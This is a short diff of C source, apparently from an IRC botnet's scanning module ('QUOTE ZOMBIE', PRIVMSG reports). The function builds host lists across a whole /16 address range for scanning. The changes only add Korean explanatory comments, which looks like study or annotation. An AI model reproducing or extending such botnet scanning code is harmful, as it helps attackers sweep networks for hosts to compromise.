@@ -29,16 +29,18 @@ void cmd_scan_central(sock_t *sp, requests_t *req, unsigned short type) {
     unsigned short a, b, c;
     int i, x;
     pthread_t pthds[maxthreads];
-    scan_data_t scan_data[maxthreads];
+    scan_data_t scan_data[maxthreads];	// scan_data_t (scan.h)
 
     total = 0;
     founds = 0;
     c = 0;
 
+	/* 기존의 result_file을 제거하고 새로 생성한다 */
     sleep(2);
     remove(result_file);
     resfd = fopen(result_file, "a+");
     
+	/* resfd에 아무것도 없으면 에러메세지 */
     if (resfd == NULL) {
         sockwrite(sp->sockfd, "PRIVMSG %s :[error] unable to open: %s\n", channel, result_file);
         sockwrite(sp->sockfd, "QUOTE ZOMBIE\n");
@@ -47,6 +49,7 @@ void cmd_scan_central(sock_t *sp, requests_t *req, unsigned short type) {
 
     memset(hosts, 0, sizeof hosts);
     
+	/* hosts배열에 rcv_sb, rcv_sc, a, b 값을 저장 */
     for (a = 0; a <= 255; a++) {
         for (b = 0; b <= 255; b++) {
             snprintf(hosts[c], sizeof(hosts[c]), "%s.%s.%d.%d", req->rcv_sb, req->rcv_sc, a, b);
